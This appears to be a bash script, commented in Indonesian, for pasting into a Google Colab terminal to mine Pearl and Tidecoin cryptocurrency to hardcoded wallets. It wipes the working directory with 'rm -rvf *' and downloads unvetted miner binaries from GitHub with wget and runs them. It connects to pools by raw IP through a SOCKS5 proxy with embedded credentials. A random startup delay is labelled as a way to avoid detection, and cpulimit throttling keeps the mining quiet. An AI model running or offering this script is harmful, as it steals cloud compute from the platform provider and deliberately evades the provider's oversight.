#!/bin/bash
# ============================================
# MINN — Mining Colab Script
# 1 paste ke terminal Colab, langsung jalan
# ============================================

# Wallet lu
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"

WORKER=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)

echo "[MINN] Worker: $WORKER"
echo "[MINN] PRL → $PRL"
echo "[MINN] TDC → $TDC"

# ── Bersihin + setup ──
rm -rvf * 2>/dev/null
mkdir a && cd a

# ── Delay random (hindarin detection) ──
sleep $((RANDOM % 20 + 5))

# ── Download peak (PRL miner) ──
wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak
chmod +x peak

# ── Download sse2 (Tidecoin miner) ──
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2
chmod +x sse2

# ── Install cpulimit ──
apt-get install -y -qq cpulimit 2>/dev/null

# ── Jalanin PRL miner ──
(while true; do
    ./peak --coin pearl \
        --url 23.94.21.110:80 \
        --user ${PRL}.${WORKER} \
        --proxy socks5://majapahlevi:majapahlevi@23.94.21.110:443
    sleep 5
done) &
PEAK_PID=$!

# ── Cpulimit PRL miner ──
cpulimit -l 55 -p $PEAK_PID 2>/dev/null &

sleep 10

# ── Jalanin Tidecoin miner ──
./sse2 -a yespowertide \
    -o 47.251.244.12:80 \
    -u ${TDC}.${WORKER} \
    -t 2 > /dev/null 2>&1 &
SSE2_PID=$!

# ── Cpulimit Tidecoin miner ──
cpulimit -l 55 -p $SSE2_PID 2>/dev/null &

echo "[MINN] Both miners running. PRL PID=$PEAK_PID, TDC PID=$SSE2_PID"

# ── Auto-shutdown after 4 jam ──
(sleep 14400 && kill $PEAK_PID $SSE2_PID 2>/dev/null && echo "[MINN] Session expired — auto shutdown") &

# ── Keep alive ──
wait